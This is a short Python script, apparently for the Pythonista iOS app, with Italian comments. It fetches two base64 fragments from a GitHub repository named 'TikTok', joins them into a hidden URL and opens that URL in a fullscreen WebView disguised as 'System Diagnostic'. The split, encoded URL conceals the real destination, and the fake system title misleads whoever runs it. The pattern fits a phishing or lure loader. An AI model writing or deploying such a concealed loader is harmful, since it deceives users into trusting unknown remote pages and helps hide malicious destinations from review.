import requests
import ui

def brain():
    # Carichiamo base64 direttamente qui per uccidere l'errore NameError
    import base64
    
    # URL preciso basato sul tuo repository e sul branch 'principale'
    BASE = "https://raw.githubusercontent.com/christianniederhauser906-ship-it/TikTok/principale/"
    
    try:
        # Recupero i file parte1.py e part2_1.py
        r1 = requests.get(BASE + "parte1.py")
        r2 = requests.get(BASE + "part2_1.py")
        
        if r1.status_code == 200 and r2.status_code == 200:
            p1 = r1.text.strip()
            p2 = r2.text.strip()
            
            # Decodifica l'URL unendo i pezzi
            full_link = base64.b64decode(p1 + p2).decode('utf-8', errors='ignore')
            
            # Lancia la finestra interna (WebView)
            v = ui.WebView()
            v.name = "System Diagnostic"
            v.load_url(full_link)
            v.present('fullscreen')
        else:
            print(f"Errore: File non trovati su GitHub (Status: {r1.status_code})")
            
    except Exception as e:
        print(f"Errore assemblaggio: {e}")

if __name__ == "__main__":
    brain()
